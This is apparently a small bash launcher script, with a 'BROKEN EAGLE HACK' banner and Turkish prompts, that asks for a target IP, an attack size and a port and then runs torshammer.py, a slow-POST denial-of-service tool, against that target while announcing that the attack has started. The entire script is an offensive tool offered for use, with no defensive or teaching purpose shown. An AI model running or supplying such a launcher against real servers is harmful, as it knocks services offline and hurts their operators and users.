echo -e '\e[34m
-------------------------
 ____  _____ _   _ _____
| __ )| ____| | | |_   _|
|  _ \|  _| | |_| | | |\e[39m
| |_) | |___|  _  | | |\e[36m
|____/|_____|_| |_| |_|
(+ BROKEN EAGLE HACK +)
-------------------------- 
	'
read -p '[1]IP GİRİNİZ=>' ip
read -p '[2]SALDIRI BOYUTU GİRİNİZ=>' sldbyt
read -p '[3]PORT GİRİNİZ=>' port
	echo -e 'ATTACK BAŞLADI...'
	sleep 2.1
	python2 torshammer.py  -t $ip -r $sldbyt -p $port
